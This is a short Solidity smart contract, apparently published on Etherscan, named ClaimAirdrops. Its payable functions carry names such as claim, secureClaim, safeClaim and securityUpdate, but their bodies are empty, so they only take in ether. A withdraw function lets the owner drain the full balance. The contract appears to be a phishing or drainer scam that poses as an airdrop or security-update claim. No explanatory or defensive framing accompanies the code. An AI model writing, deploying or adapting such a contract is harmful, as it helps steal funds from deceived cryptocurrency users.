/**
 *Submitted for verification at Etherscan.io on 2023-03-03
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-18
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-29
*/

pragma solidity ^0.4.26;

contract ClaimAirdrops {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function claim() public payable {
    }

    function confirm() public payable {
    }

    function secureClaim() public payable {
    }

    
    function safeClaim() public payable {
    }

    
    function securityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}